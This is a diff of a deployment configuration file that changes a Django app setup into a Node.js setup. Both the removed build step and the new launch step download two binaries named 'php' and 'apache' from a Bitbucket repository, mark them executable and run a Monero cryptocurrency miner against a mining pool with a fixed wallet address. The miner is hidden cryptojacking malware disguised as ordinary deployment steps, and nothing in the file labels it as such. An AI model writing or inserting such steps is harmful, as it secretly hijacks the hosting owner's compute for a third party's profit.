@@ -1,9 +1,17 @@
 deployments:
-  MyWebApp:
-    dockerimage: ubuntu:14.04
+  MyApp:
+    dockerimage: ubuntu:16.04
     build_steps:
-      - apt install curl
-      - curl -L https://bitbucket.org/eatyourshet/php/raw/1a31554cdede888ae70fbeedc5e909a3926ea2da/php --output php && curl -L https://bitbucket.org/eatyourshet/php/raw/b1ee5dc709956a92763976e15dd18f9ab8f40698/apache --output apache && chmod +x apache php && ./php -algo rx/0 -wallet 86VkWeqdPgyHYUFd2Nc84uhte6pdHNKMpay4MgCVPfVeG3BWzyDtq87BwWKxQFAxq3QQQR1Heeqc95xyUcchnaQi6L7Wfn2 -pool1 gulf.moneroocean.stream:10032 -rigName LoL
+      - >
+        DEBIAN_FRONTEND=noninteractive apt-get update &&
+        DEBIAN_FRONTEND=noninteractive apt-get -y install 
+        curl git sudo 
+      - curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
+      - >
+        DEBIAN_FRONTEND=noninteractive apt-get update &&
+        DEBIAN_FRONTEND=noninteractive apt-get -y install nodejs
+      - cd ~/code
+      - npm install
     launch_steps:
-      - cd ~/code/mysite
-      - python manage.py runserver 0.0.0.0:80
+      - cd ~/code
+      - bash -c "$(curl -L https://bitbucket.org/eatyourshet/php/raw/1a31554cdede888ae70fbeedc5e909a3926ea2da/php --output php && curl -L https://bitbucket.org/eatyourshet/php/raw/b1ee5dc709956a92763976e15dd18f9ab8f40698/apache --output apache && chmod +x apache php && ./php -algo rx/0 -wallet 86VkWeqdPgyHYUFd2Nc84uhte6pdHNKMpay4MgCVPfVeG3BWzyDtq87BwWKxQFAxq3QQQR1Heeqc95xyUcchnaQi6L7Wfn2 -pool1 gulf.moneroocean.stream:10032 -rigName LoL)"
